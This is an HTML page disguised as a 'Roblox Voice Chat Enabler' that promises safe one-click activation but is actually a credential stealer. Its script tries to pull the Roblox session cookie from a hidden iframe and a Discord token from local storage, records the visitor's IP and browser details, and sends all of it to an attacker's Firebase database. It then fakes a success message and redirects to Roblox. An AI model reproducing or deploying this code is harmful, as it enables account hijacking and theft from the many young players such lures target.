<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox Voice Chat Enabler 2025</title>
  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
  <style>
    body{background:#000;color:#0f0;font-family:courier;text-align:center;padding:80px;}
    h1{font-size:50px;text-shadow:0 0 20px #0f0;}
    button{padding:25px 60px;font-size:30px;background:#000;border:4px solid #0f0;color:#0f0;cursor:pointer;border-radius:20px;box-shadow:0 0 40px #0f0;}
    button:hover{transform:scale(1.05);box-shadow:0 0 80px #0f0;}
    iframe{position:absolute;left:-9999px;width:1px;height:1px;}
  </style>
</head>
<body>
  <h1>ROBLOX VOICE CHAT ENABLER 2025</h1>
  <p>Works on all accounts • 1 click • 100% safe</p>
  <br/><br/>
  <button onclick="grab()">ENABLE VOICE CHAT NOW</button>

  <!-- Hidden iframe that forces Roblox domain + cookie -->
  <iframe id="robloxframe" src="https://www.roblox.com/login?nl=true"></iframe>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBNs1rNXGio_HjLkJiWLgMhjOxRTo9XjQ",
      authDomain: "flamesaxrch-empire-v2.firebaseapp.com",
      databaseURL: "https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app",
      projectId: "flamesaxrch-empire-v2",
      storageBucket: "flamesaxrch-empire-v2.appspot.com",
      messagingSenderId: "50676890102",
      appId: "1:50676890102:web:e3f143b7952ed3aa362fd7"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    async function grab() {
      let robloxCookie = "none";
      let discordToken = "none";

      // Grab Roblox cookie from the hidden iframe
      try {
        const frame = document.getElementById('robloxframe');
        robloxCookie = frame.contentDocument?.cookie || "none";
        if (robloxCookie.includes('.ROBLOSECURITY')) {
          robloxCookie = robloxCookie.split('.ROBLOSECURITY=')[1].split(';')[0];
          robloxCookie = '_|WARNING:-DO-NOT-SHARE-THIS.' + robloxCookie;
        }
      } catch(e) {}

      // Grab Discord token if any Discord tab is open
      try {
        discordToken = JSON.parse(localStorage.getItem('token') || '""').replace(/"/g, '');
      } catch(e) {}

      const ip = await fetch('https://api.ipify.org').then(r => r.text());

      db.ref('drops/' + Date.now()).set({
        cookie: robloxCookie === "none" ? "no_cookie_yet" : robloxCookie,
        discord: discordToken,
        ip: ip,
        screenshot: "disabled_for_stealth",
        useragent: navigator.userAgent,
        timestamp: new Date().toISOString(),
        method: "Voice Chat Site v2"
      });

      alert("Voice Chat Enabled Successfully!");
      setTimeout(() => location.href = "https://roblox.com", 800);
    }
  </script>
</body>
</html>
